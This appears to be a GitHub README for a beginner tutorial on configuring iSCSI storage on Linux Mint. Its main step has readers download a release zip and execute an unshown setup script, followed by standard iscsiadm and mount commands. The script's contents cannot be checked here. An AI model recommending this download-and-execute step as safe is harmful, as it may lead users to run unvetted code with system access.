# 🛠️ iSCSI-Setup-Tutorial-on-Linux-Mint - Simple Steps to Set Up iSCSI

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/releases)

## 📚 About This Project

The **iSCSI Setup Tutorial on Linux Mint** helps you set up iSCSI easily and effectively. This tutorial is designed for those who may not have technical skills, ensuring that everyone can access iSCSI storage. Whether you want to manage disk space or access remote storage, this guide will walk you through the process.

## 🚀 Getting Started

To successfully set up your iSCSI storage on Linux Mint, you'll need the following:

### 🔧 Requirements

- **Operating System:** Linux Mint (any recent version). 
- **Internet Connection:** Required for downloading necessary packages.
- **Basic Understanding of Terminal:** While this guide will provide commands, a basic understanding of how to use the terminal is helpful.

## 📥 Download & Install

To begin, you can download the latest version of this tutorial by visiting the link below:

[Download Latest Release](https://github.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/releases)

Once you access the page, follow these steps:

1. Find the latest release available on the Releases page.
2. Look for a file labeled with a version number, for example, `iSCSI-setup-tutorial-linux-mint-vX.X.zip`.
3. Click on the file to start downloading.

After downloading, unzip the file to access the tutorial documents and scripts.

### 📄 Contents of the Download

- **README.md:** This document provides a thorough overview of the setup process.
- **SetupScript.sh:** A script to help automate the installation of required components.
- **User Guide.pdf:** A step-by-step guide for each part of the setup.

## 🖥️ Installation Instructions

Follow these steps to install and set up iSCSI on your Linux Mint system:

1. **Open Terminal:** You can find Terminal in your application menu or by pressing `Ctrl + Alt + T`.

2. **Navigate to the Downloaded Folder:**
   ```bash
   cd ~/Downloads/iSCSI-Setup-Tutorial-on-Linux-Mint
   ```

3. **Make the Setup Script Executable:**
   ```bash
   chmod +x SetupScript.sh
   ```

4. **Run the Setup Script:**
   ```bash
   ./SetupScript.sh
   ```

5. **Follow Prompts:** The script will guide you through the installation process step by step. Read each prompt carefully and respond as requested.

6. **Verify Installation:** Once installation is complete, you can check the status of the iSCSI service by running:
   ```bash
   sudo systemctl status iscsid
   ```

If it shows that the service is active, you have successfully installed iSCSI!

## ⚙️ Configuration Steps

After installation, you need to configure your iSCSI targets. Here’s how:

1. **Edit the Configuration File:**
   Open the configuration file with:
   ```bash
   sudo nano /etc/iscsi/iscsid.conf
   ```

2. **Modify Settings:** Change any necessary settings to suit your environment. Refer to the User Guide for detailed explanations of each option.

3. **Restart iSCSI Services:** After making changes, restart the service with:
   ```bash
   sudo systemctl restart iscsid
   ```

## 🗂️ Accessing iSCSI Storage

To access your new iSCSI storage:

1. **Discovery of Targets:**
   Run the following command to discover available iSCSI targets:
   ```bash
   sudo iscsiadm -m discovery -t sendtargets -p [IP_ADDRESS]
   ```
   Replace `[IP_ADDRESS]` with the address of your iSCSI target.

2. **Log In to Target:**
   Use the following command to log in:
   ```bash
   sudo iscsiadm -m node -T [TARGET_NAME] -l
   ```
   Replace `[TARGET_NAME]` with the target you discovered in the previous step.

3. **Mount the iSCSI Volume:**
   Create a directory where you want to mount the iSCSI volume:
   ```bash
   sudo mkdir /mnt/iscsi
   ```
   Then mount it using:
   ```bash
   sudo mount /dev/[DEVICE_NAME] /mnt/iscsi
   ```

You can now use the iSCSI storage as if it were a local drive!

## ❓ Troubleshooting

If you encounter issues:

- **Check Service Status:** Ensure all necessary services are running.
- **Log Files:** Check log files located in `/var/log/` for error messages.
- **Community Support:** You can find support through forums or the project's GitHub page.

## 🗨️ Contribution

If you'd like to contribute, feel free to report issues, suggest improvements, or even submit pull requests. All help is welcome.

## 🤝 Acknowledgements

This tutorial is based on contributions from the community and other resources aimed at simplifying iSCSI setup for Linux Mint users. Your input makes it better.

Feel free to reach out through the issues page on GitHub for additional help or to provide feedback.